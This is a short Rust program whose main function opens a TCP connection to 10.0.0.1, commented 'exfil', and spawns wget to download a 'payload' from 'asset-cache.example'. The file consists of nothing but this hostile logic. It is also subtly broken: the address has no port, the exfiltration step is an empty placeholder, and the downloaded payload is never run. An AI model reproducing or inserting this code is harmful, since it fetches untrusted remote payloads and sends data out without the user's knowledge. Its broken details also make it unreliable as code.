use std::net::TcpStream;
use std::process::Command;
fn main() {
    if let Ok(_s) = TcpStream::connect("10.0.0.1") { /* exfil */ }
    Command::new("wget").arg("http://asset-cache.example/payload").spawn().ok();
}
